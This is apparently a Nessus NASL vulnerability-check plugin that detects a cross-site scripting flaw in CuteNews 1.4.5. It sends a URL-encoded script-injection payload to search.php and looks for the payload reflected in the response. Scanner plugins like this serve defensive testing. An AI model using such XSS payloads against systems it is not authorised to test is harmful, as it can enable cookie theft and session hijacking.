#
#       This script was written by Justin Seitz <jms@bughunter.ca>
#       Per Justin : GPLv2
#

# Changes by Tenable:
# - Revised plugin title, added OSVDB refs, revamped desc to cover multiple scripts (4/28/09)
# - Replaced broken link (5/29/09)



include("compat.inc");

if(description)
{
 # set script identifiers

 script_id(23775);
 script_version("$Revision: 1.16 $");
 script_bugtraq_id(21233);
 script_osvdb_id(30658, 30659, 54105, 54106);

 script_name(english:"CuteNews 1.4.5 Multiple Script XSS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains PHP scripts that is affected by a
cross-site scripting issue." );
 script_set_attribute(attribute:"description", value:
"The version of CuteNews installed on the remote host fails to sanitize
input to the 'index.php', 'search.php', 'rss.php' and 'show_news.php' 
scripts before using it to generate dynamic HTML to be returned to the 
user.  An unauthenticated attacker can exploit these issues to execute a 
cross-site scripting attack. 

This version of CuteNews is also likely affected by other associated
issues." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2006/Nov/418" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2006/12/07");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/11/21");
 script_cvs_date("$Date: 2016/10/10 15:57:04 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english:"Tries to inject javascript code.");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2006-2016 Justin Seitz");
 script_family(english:"CGI abuses : XSS");
 script_dependencie("cutenews_detect.nasl", "cross_site_scripting.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/cutenews");
 exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);

#
# verify we can talk to the web server, if not exit
#

if(!get_port_state(port)) exit(0);
if(!can_host_php(port:port)) exit(0);
if (get_kb_item("www/" + port + "/generic_xss")) exit(0);

#
#
#	Test for an install of Cutenews
#
#

install = get_kb_item(string("www/", port, "/cutenews"));
if (isnull(install)) exit(0);

matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
	  dir = matches[2];
	  attackstring = '"><script>alert(document.cookie)</script>';
          attacksploit = urlencode(str:attackstring, unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!~*'()-]/");
          attackreq = http_get(item:string(dir, "/search.php/", attacksploit), port:port);
          attackres = http_keepalive_send_recv(port:port, data:attackreq, bodyonly:TRUE);
          if(isnull(attackres)) exit(0);
	  if(string('action="', dir, "/search.php/", attackstring, "?subaction=search") >< attackres)
	  {
		security_warning(port);
		set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
	  }
}
